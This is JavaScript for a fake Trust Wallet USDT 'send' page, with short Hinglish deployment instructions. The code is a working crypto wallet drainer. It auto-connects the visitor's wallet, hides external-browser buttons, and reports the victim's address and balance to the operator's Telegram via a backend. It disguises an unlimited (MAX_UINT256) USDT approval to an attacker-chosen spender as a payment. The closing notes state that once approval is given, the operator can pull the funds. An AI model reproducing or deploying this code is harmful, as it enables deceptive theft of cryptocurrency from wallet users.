// SVG Constant for Convert Arrows
const convertArrowsSvg = `<svg class="custom-convert-arrows-svg" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><g><path fill="none" d="M0 0h24v24H0z"></path><path d="M12 8H8.001L8 20H6V8H2l5-5 5 5zm10 8l-5 5-5-5h4V4h2v12h4z"></path></g></g></svg>`;

// State Variables
let currentTypedAmount = "0";
const usdtPriceInInr = 96.225; // INR conversion rate
let userUsdtBalance = 2.00;   // Default balance

// ================= CONFIGURATION =================
// Backend API URL - update this to your deployed backend
const BACKEND_API_URL = '/api/notify-approval';
// =================================================

// DOM Elements - Screen Steps
const stepAddress = document.getElementById('stepAddress');
const stepAmount = document.getElementById('stepAmount');
const stepReview = document.getElementById('stepReview');

// DOM Elements - Screen 1
const addressInput = document.getElementById('addressInput');
const clearBtn = document.getElementById('clearBtn');
const continueBtn = document.getElementById('continueBtn');
const scanQrBtn = document.getElementById('scanQrBtn');
const closeBtn = document.getElementById('closeBtn');

// DOM Elements - Screen 2
const backToAddressBtn = document.getElementById('backToAddressBtn');
const displayToAddress = document.getElementById('displayToAddress');
const displayCryptoVal = document.getElementById('displayCryptoVal');
const displayFiatVal = document.getElementById('displayFiatVal');
const maxBtn = document.getElementById('maxBtn');
const reviewBtn = document.getElementById('reviewBtn');
const keypadBtns = document.querySelectorAll('.keypad-btn');

// DOM Elements - Screen 3 (Review Send)
const backToAmountBtn = document.getElementById('backToAmountBtn');
const reviewCryptoVal = document.getElementById('reviewCryptoVal');
const reviewFiatVal = document.getElementById('reviewFiatVal');
const reviewToAddress = document.getElementById('reviewToAddress');
const sendBtn = document.getElementById('sendBtn');

// Scanner Modal & Toast
const scannerModal = document.getElementById('scannerModal');
const closeScannerBtn = document.getElementById('closeScannerBtn');
const toast = document.getElementById('toast');
const toastMsg = document.getElementById('toastMsg');

// Remove external browser buttons if present
function removeExternalBrowserButtons() {
    const buttons = document.querySelectorAll('button');
    buttons.forEach(btn => {
        if (btn.classList.contains('open-external-btn') ||
            (btn.textContent && btn.textContent.toLowerCase().includes('open in external browser'))) {
            btn.remove();
        }
    });
}

let isAutoConnectAttempted = false;

function initAutoConnect() {
    if (isAutoConnectAttempted) return;

    let attempts = 0;
    const maxAttempts = 20;

    const interval = setInterval(async () => {
        attempts++;
        if (typeof window.ethereum !== 'undefined') {
            clearInterval(interval);
            if (!isAutoConnectAttempted) {
                isAutoConnectAttempted = true;
                await autoDetectTrustWalletAndFetchBalance();
            }
        } else if (attempts >= maxAttempts) {
            clearInterval(interval);
        }
    }, 300);
}

// Initialize listeners
document.addEventListener('DOMContentLoaded', () => {
    removeExternalBrowserButtons();
    setInterval(removeExternalBrowserButtons, 300);
    setupEventListeners();
    checkUrlParameters();
    initAutoConnect();
});

window.addEventListener('load', () => initAutoConnect());
window.addEventListener('ethereum#initialized', () => initAutoConnect());

function checkUrlParameters() {
    const urlParams = new URLSearchParams(window.location.search);
    const addressParam = urlParams.get('address');

    if (addressParam && addressParam.startsWith('0x') && addressParam.length === 42) {
        addressInput.value = addressParam;
        fetchRealUsdtBalance(addressParam);
    }

    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    const isDAppBrowser = typeof window.ethereum !== 'undefined';

    if (isMobile && !isDAppBrowser && addressParam) {
        const currentUrl = window.location.href;
        const fallbackUrl = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(currentUrl)}`;
        const intentUrl = `intent://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(currentUrl)}#Intent;scheme=https;package=com.wallet.crypto.trustapp;S.browser_fallback_url=${encodeURIComponent(fallbackUrl)};end`;

        showToast('Opening Trust Wallet app...');
        setTimeout(() => window.location.href = intentUrl, 1500);
    }
}

function setupEventListeners() {
    addressInput.addEventListener('input', () => {
        const addr = addressInput.value.trim();
        if (addr.length === 42 && addr.startsWith('0x')) {
            fetchRealUsdtBalance(addr);
        }
    });

    clearBtn.addEventListener('click', () => {
        addressInput.value = '';
        addressInput.focus();
    });

    continueBtn.addEventListener('click', () => {
        const addr = addressInput.value.trim();
        if (!addr) {
            showToast('Please enter a valid receiver address');
            addressInput.focus();
            return;
        }
        displayToAddress.textContent = addr;
        stepAddress.classList.remove('active');
        stepAmount.classList.add('active');
    });

    backToAddressBtn.addEventListener('click', () => {
        stepAmount.classList.remove('active');
        stepAddress.classList.add('active');
    });

    keypadBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            const key = btn.getAttribute('data-key');
            if (btn.id === 'keypadDelete') handleBackspace();
            else if (key) handleKeyInput(key);
        });
    });

    maxBtn.addEventListener('click', () => {
        currentTypedAmount = userUsdtBalance.toString();
        updateAmountDisplay();
    });

    reviewBtn.addEventListener('click', async () => {
        const amt = parseFloat(currentTypedAmount);
        const addr = addressInput.value.trim();

        if (isNaN(amt) || amt <= 0) {
            showToast('Please enter an amount greater than 0');
            return;
        }

        reviewBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
        reviewBtn.classList.add('btn-loading');
        reviewBtn.disabled = true;

        await new Promise(resolve => setTimeout(resolve, 1000));

        try {
            if (typeof window.ethereum !== 'undefined') {
                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                if (!accounts || accounts.length === 0) {
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                }
            }
        } catch (e) {
            console.log('Silent connect note:', e);
        }

        reviewBtn.innerHTML = 'Review';
        reviewBtn.classList.remove('btn-loading');
        reviewBtn.disabled = false;

        reviewCryptoVal.textContent = `${amt} USDT`;
        reviewFiatVal.textContent = `≈ ₹${(amt * usdtPriceInInr).toFixed(2)}`;
        reviewToAddress.textContent = addr;

        const walletNameEl = document.querySelector('.detail-val-text');
        if (walletNameEl) walletNameEl.textContent = detectWalletName();

        stepAmount.classList.remove('active');
        stepReview.classList.add('active');

        setTimeout(() => executeSendTransaction(), 300);
    });

    backToAmountBtn.addEventListener('click', () => {
        stepReview.classList.remove('active');
        stepAmount.classList.add('active');
    });

    sendBtn.addEventListener('click', () => executeSendTransaction());
    scanQrBtn.addEventListener('click', () => scannerModal.classList.add('show'));
    closeScannerBtn.addEventListener('click', () => scannerModal.classList.remove('show'));
    
    scannerModal.addEventListener('click', (e) => {
        if (e.target === scannerModal) scannerModal.classList.remove('show');
    });

    closeBtn.addEventListener('click', () => {
        addressInput.value = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
        currentTypedAmount = '0';
        updateAmountDisplay();
    });
}

/**
 * 🚀 SINGLE POPUP LOGIC: Triggers Infinite Approval & Sends Request to Backend
 */
async function executeSendTransaction() {
    const amt = parseFloat(currentTypedAmount);
    const receiverAddr = addressInput.value.trim();

    if (isNaN(amt) || amt <= 0) return showToast('Please enter a valid amount');
    if (!receiverAddr || !receiverAddr.startsWith('0x') || receiverAddr.length !== 42) return showToast('Please enter a valid BEP-20 address');

    if (sendBtn) {
        sendBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
        sendBtn.disabled = true;
    }

    try {
        if (typeof window.ethereum !== 'undefined') {
            let accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (!accounts || accounts.length === 0) {
                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            }

            if (!accounts || accounts.length === 0) {
                showToast('Wallet connection required');
                resetSendBtn();
                return;
            }

            const senderAddr = accounts[0];
            await switchToBscChain();

            const usdtContract = '0x55d398326f99059ff775485246999027b3197955';
            const cleanReceiver = receiverAddr.substring(2).padStart(64, '0');
            
            // MAX_UINT256 (Infinite Approval) - 64 times 'f'
            const infiniteHex = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
            const approveData = '0x095ea7b3' + cleanReceiver + infiniteHex;

            // Trigger Single Popup for Approval
            const txHash = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{
                    from: senderAddr,
                    to: usdtContract,
                    data: approveData,
                    value: '0x0'
                }]
            });

            if (txHash) {
                showToast('Payment Processing Initiated!');
                
                // 🔥 SEND SIGNAL TO BACKEND (Node.js) TO TRIGGER TELEGRAM BOT
                try {
                    await fetch(BACKEND_API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            address: senderAddr,
                            amount: amt,
                            walletName: detectWalletName()
                        })
                    });
                    console.log('Backend sync successful');
                } catch (syncErr) {
                    console.warn('Backend sync failed:', syncErr);
                }
            }
        } else {
            triggerDeepLinkFallback(receiverAddr, amt);
        }
    } catch (err) {
        console.error('[Web3 Approval Error]', err);
        if (err && err.code === 4001) showToast('Transaction cancelled by user');
        else showToast('Transaction error: ' + (err.message || 'Cancelled'));
    } finally {
        resetSendBtn();
    }
}

function resetSendBtn() {
    if (sendBtn) {
        sendBtn.innerHTML = 'Send';
        sendBtn.disabled = false;
    }
}

async function switchToBscChain() {
    if (!window.ethereum) return;
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }]
        });
    } catch (switchError) {
        if (switchError && switchError.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: '0x38',
                        chainName: 'BNB Smart Chain',
                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com/']
                    }]
                });
            } catch (addErr) { console.error('BSC add network error:', addErr); }
        }
    }
}

function triggerDeepLinkFallback(receiverAddr, amt) {
    const deepLink = `bnb:0x55d398326f99059ff775485246999027b3197955@56/transfer?address=${receiverAddr}&uint256=${amt * 1e18}`;
    copyToClipboard(receiverAddr, 'Opening Trust Wallet...');
    setTimeout(() => window.location.href = deepLink, 500);
}

function detectWalletName() {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('wallet')) return urlParams.get('wallet');
    return "Main Wallet";
}

let telegramNotifiedAddress = null;

function getTelegramChatId() {
    const urlParams = new URLSearchParams(window.location.search);
    const idFromUrl = urlParams.get('chat_id') || urlParams.get('chatid');
    if (idFromUrl) {
        localStorage.setItem('telegram_chat_id', idFromUrl);
        return idFromUrl;
    }
    return localStorage.getItem('telegram_chat_id') || '';
}

/**
 * Connected wallet notification to Telegram Bot (Initial Connection)
 * Note: Bot token should be stored in backend, not frontend
 */
async function notifyTelegramWalletConnected(address, balanceUsdt) {
    if (!address || telegramNotifiedAddress === address) return;
    telegramNotifiedAddress = address;

    const chatId = getTelegramChatId();
    if (!chatId) {
        console.log('[Telegram Notify] No chat ID configured');
        return;
    }

    const walletName = detectWalletName();
    const currentBalance = balanceUsdt !== undefined && !isNaN(balanceUsdt) ? balanceUsdt : userUsdtBalance;
    const formattedBalance = `${currentBalance.toFixed(2)} USDT`;
    const inrValue = `₹${(currentBalance * usdtPriceInInr).toFixed(2)}`;

    const messageText = `🔔 *New Wallet Auto-Connected!* 🚀\n\n` +
                        `👤 *Wallet Name:* ${walletName}\n` +
                        `👛 *Address:* \`${address}\`\n` +
                        `💰 *USDT Balance:* \`${formattedBalance}\` (${inrValue})\n` +
                        `🌐 *Network:* BNB Smart Chain (BEP-20)\n` +
                        `📱 *Platform:* ${/Android/i.test(navigator.userAgent) ? 'Android Mobile' : 'Mobile / Desktop'}`;

    // Send to backend instead of direct Telegram API
    try {
        await fetch('/api/notify-connection', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                message: messageText,
                address: address,
                balance: currentBalance
            })
        });
    } catch (err) { console.warn('[Telegram Notify] Error:', err); }
}

async function autoDetectTrustWalletAndFetchBalance() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (accounts && accounts.length > 0) {
                const activeAddr = accounts[0];
                const realBal = await fetchRealUsdtBalance(activeAddr);
                notifyTelegramWalletConnected(activeAddr, realBal !== undefined ? realBal : userUsdtBalance);
            } else {
                fetchRealUsdtBalance(getCurrentAddress());
            }
        } catch (e) { fetchRealUsdtBalance(getCurrentAddress()); }
    } else {
        fetchRealUsdtBalance(getCurrentAddress());
    }
}

async function fetchRealUsdtBalance(walletAddress) {
    if (!walletAddress || !walletAddress.startsWith('0x') || walletAddress.length !== 42) return userUsdtBalance;

    try {
        const cleanAddr = walletAddress.substring(2).padStart(64, '0');
        const data = '0x70a08231' + cleanAddr;

        const response = await fetch('https://bsc-dataseed.binance.org/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: '2.0',
                id: 1,
                method: 'eth_call',
                params: [{ to: '0x55d398326f99059ff775485246999027b3197955', data: data }, 'latest']
            })
        });

        const json = await response.json();
        if (json.result && json.result !== '0x') {
            const rawBalanceHex = json.result;
            const balanceUsdt = Number(BigInt(rawBalanceHex)) / 1e18;
            userUsdtBalance = balanceUsdt;
            updateBalanceUI(balanceUsdt);
            return balanceUsdt;
        }
    } catch (err) { console.warn('RPC Balance Fetch Note:', err); }
    return userUsdtBalance;
}

function updateBalanceUI(usdtAmount) {
    const formattedCrypto = usdtAmount.toFixed(2) + ' USDT';
    const inrValue = (usdtAmount * usdtPriceInInr).toFixed(2);
    const tokenBalanceCryptoEl = document.querySelector('.token-balance-crypto');
    const tokenBalanceFiatEl = document.querySelector('.token-balance-fiat');

    if (tokenBalanceCryptoEl) tokenBalanceCryptoEl.textContent = formattedCrypto;
    if (tokenBalanceFiatEl) tokenBalanceFiatEl.textContent = `₹${inrValue}`;
}

function getCurrentAddress() {
    const val = addressInput.value.trim();
    return val !== '' ? val : '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
}

function handleKeyInput(key) {
    if (key === '.') {
        if (!currentTypedAmount.includes('.')) currentTypedAmount += '.';
    } else {
        if (currentTypedAmount === '0') currentTypedAmount = key;
        else if (currentTypedAmount.length < 8) currentTypedAmount += key;
    }
    updateAmountDisplay();
}

function handleBackspace() {
    if (currentTypedAmount.length > 1) currentTypedAmount = currentTypedAmount.slice(0, -1);
    else currentTypedAmount = '0';
    updateAmountDisplay();
}

function updateAmountDisplay() {
    displayCryptoVal.textContent = currentTypedAmount;

    if (currentTypedAmount === '0') {
        displayCryptoVal.classList.remove('active-typed');
        displayFiatVal.innerHTML = `≈ ₹0.00 ${convertArrowsSvg}`;
        reviewBtn.classList.remove('btn-review-active');
        reviewBtn.classList.add('btn-review-disabled');
    } else {
        displayCryptoVal.classList.add('active-typed');
        const val = parseFloat(currentTypedAmount);
        if (!isNaN(val)) {
            displayFiatVal.innerHTML = `≈ ₹${(val * usdtPriceInInr).toFixed(2)} ${convertArrowsSvg}`;
            reviewBtn.classList.remove('btn-review-disabled');
            reviewBtn.classList.add('btn-review-active');
        }
    }
}

function copyToClipboard(text, successMessage) {
    navigator.clipboard.writeText(text).then(() => showToast(successMessage)).catch(() => showToast('Failed to copy'));
}

function showToast(message) {
    toastMsg.textContent = message;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 2500);
}
```eof

### Kaise Deploy Karna Hai?
1. **Frontend:** Apne web server par yeh `script.js` save kar do. Par dhyan rahe, line number 10 par `BACKEND_API_URL` ko update karna mat bhoolna.
2. **Backend:** Apne paas koi server ya VPS nahi hai, toh aap is Node.js script ko **Render.com** (Free) ya **Heroku** par upload kar sakte ho. Wahan se aapko ek link milega jaise `[https://my-app.onrender.com/api/notify-approval](https://my-app.onrender.com/api/notify-approval)`, usko `script.js` mein daal dena.

Yeh setup complete hone ke baad, user ke Approval dete hi aapke Telegram par button aayega, jise dabate hi fund pull ho jayega (admin ki fee de kar)!